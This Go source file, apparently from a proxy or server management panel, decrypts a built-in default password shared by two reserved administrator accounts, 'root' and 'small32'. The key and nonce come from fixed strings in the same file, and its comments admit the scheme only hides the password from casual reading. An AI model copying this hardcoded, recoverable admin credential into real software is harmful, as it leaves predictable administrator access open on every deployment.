package database

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
)

// 内置 root / small32 账号的默认口令不在源码中明文出现，而是以
// AES-256-GCM 密文形式存储（见 defaultAdminPasswordCipher）。密钥与非签种子
// 由独立的内部派生串生成，与口令明文解耦；运行时解密得到的明文仅用于
// 初始化时生成 bcrypt 哈希并写入数据库，不落盘、不打日志。
//
// 说明：密钥与密文同源同进程，这对防御"从源码/二进制 strings 里直接读到
// 固定口令"足够，但并非密码学意义上的安全边界，属于纵深防御的一层。
const (
	defaultAdminPasswordCipher = "Je9oNDhFmMaPBLX5UCW9ol2e7Kyopprbhog="
	defaultCredentialKeySeed   = "xui/managed-admin-default-credential-key"
	defaultCredentialNonceSeed = "xui/managed-admin-default-credential-nonce"
)

// defaultAdminPassword 解密得到内置账号的默认口令（root 与 small32 相同）。
func defaultAdminPassword() (string, error) {
	data, err := base64.StdEncoding.DecodeString(defaultAdminPasswordCipher)
	if err != nil {
		return "", err
	}
	key := sha256.Sum256([]byte(defaultCredentialKeySeed))
	nonce := sha256.Sum256([]byte(defaultCredentialNonceSeed))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	plain, err := gcm.Open(nil, nonce[:gcm.NonceSize()], data, nil)
	if err != nil {
		return "", err
	}
	return string(plain), nil
}

// ReservedAdminPassword 导出内置默认口令，供测试与少数初始化路径使用。
// 只应在初始化时调用；面板运行过程中的实际认证仍走 bcrypt 哈希比对。
func ReservedAdminPassword() (string, error) {
	return defaultAdminPassword()
}
